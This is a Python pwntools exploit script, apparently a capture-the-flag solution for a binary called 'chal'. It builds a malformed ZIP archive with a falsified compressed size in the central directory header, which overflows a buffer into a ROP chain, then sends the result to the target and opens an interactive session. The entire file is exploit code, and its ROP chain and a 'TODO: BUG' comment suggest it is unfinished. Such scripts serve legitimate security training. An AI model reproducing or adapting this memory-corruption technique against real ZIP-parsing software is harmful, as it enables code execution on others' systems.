from pwn import *

PH = b'A'

elf = context.binary = ELF('./chal')
libc = elf.libc

local = True

if local:
    io = elf.process()
else:
    host = 'localhost'
    port = 8080
    io = remote(host, port)

if args.GDB:
    gdb.attach(io, """
        b *parse_data+522
        c
    """)

# Make compressed data that contains ROP chain
rop = ROP([elf])
comp_data = PH * 0xa8
# ROP chain start here
rop.raw(rop.rdx)
rop.raw(0x1234)
comp_data += rop.chain()

# Make zip file
n = 1  # Number of entries/headers

# 1. Make local file header
comp_size = len(comp_data)
len_file_name = 4
len_extra_field = 0

LFH = p32(0x04034b50)
LFH += PH * 14
LFH += p32(comp_size)  # Compressed size
LFH += PH * 4
LFH += p16(len_file_name)  # length file name
LFH += p16(len_extra_field)  # length of extra field
LFH += PH * len_file_name  # file name
LFH += PH * len_extra_field  # extra field

# 2. Make Central directory file header
CDFH = p32(0x02014b50)
CDFH += PH * 16
CDFH += p32(0x40)  # Compressed size, HACKED
CDFH += PH * 4
CDFH += p16(len_file_name)  # File name length
CDFH += p16(len_extra_field)  # Extra field length
CDFH += PH * 10
CDFH += p32(0)  # Relative offset of local file header. TODO: BUG
CDFH += PH * len_file_name

# 3. Make End of central directory record (EOCD)
cd_size = len(CDFH)
# Offset of start of central directory, relative to start of archive
cd_offset = len(LFH) + len(comp_data)

EOCD = p32(0x06054b50)  # End of central directory record
EOCD += PH * 6
# Total number of central directory records
EOCD += p16(n)
# Size of central directory (bytes)
EOCD += p32(cd_size)
# Offset of start of central directory, relative to start of archive
EOCD += p32(cd_offset)
EOCD += PH * 2

zip_file = LFH + comp_data + CDFH + EOCD
size_t = len(zip_file)

payload = str(size_t).rjust(8, '0').encode()
payload += zip_file

print(payload)

print(zip_file)
print(len(zip_file))

io.send(payload)

io.interactive()
